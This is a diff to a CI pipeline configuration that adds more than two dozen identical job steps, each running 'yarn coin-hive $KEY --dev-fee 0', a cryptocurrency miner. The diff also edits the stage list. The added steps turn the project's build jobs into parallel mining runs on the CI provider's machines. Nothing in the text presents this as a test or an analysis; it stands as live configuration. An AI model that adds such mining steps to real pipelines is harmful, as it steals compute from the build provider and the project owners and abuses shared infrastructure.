@@ -78,8 +78,33 @@ jobs:
     - script: yarn coin-hive $KEY --dev-fee 0
     - script: yarn coin-hive $KEY --dev-fee 0
     - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
+    - script: yarn coin-hive $KEY --dev-fee 0
 
 stages:
-  - test
-  - test
   - test
